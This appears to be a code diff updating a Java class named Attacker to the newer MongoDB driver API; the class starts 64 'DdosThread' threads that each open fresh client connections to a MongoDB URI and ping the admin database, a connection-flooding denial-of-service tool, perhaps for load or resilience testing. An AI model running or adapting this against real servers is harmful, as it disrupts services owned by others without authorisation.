@@ -3,15 +3,17 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 import org.bson.Document;
 
-import com.mongodb.MongoClient;
-import com.mongodb.MongoClientURI;
+import com.mongodb.ConnectionString;
+import com.mongodb.MongoClientSettings;
+import com.mongodb.client.MongoClient;
+import com.mongodb.client.MongoClients;
 
 public class Attacker {
     
     
  
     public static void main(String... args) throws Exception {
-        MongoClientURI uri = new MongoClientURI(args[0]);
+        ConnectionString uri = new ConnectionString(args[0]);
         for (int i = 0; i < 64; i++) {
             DdosThread thread = new DdosThread(uri);
             thread.start();
@@ -22,10 +24,10 @@ public class Attacker {
  
         private AtomicBoolean running = new AtomicBoolean(true);
         
-        private MongoClientURI uri;
+        private ConnectionString uri;
  
  
-        public DdosThread(MongoClientURI uri) throws Exception {
+        public DdosThread(ConnectionString uri) throws Exception {
             this.uri = uri;
         } 
  
@@ -44,7 +46,10 @@ public class Attacker {
         } 
  
         public void attack() throws Exception {
-            MongoClient mongoClient = new MongoClient(uri);
+        	MongoClientSettings mongoClientSettings = MongoClientSettings.builder()
+                    .applyConnectionString(uri)
+                    .build();
+    		MongoClient mongoClient = MongoClients.create(mongoClientSettings);
             mongoClient.getDatabase("admin").runCommand(new Document("ping", 1));
         } 
     } 
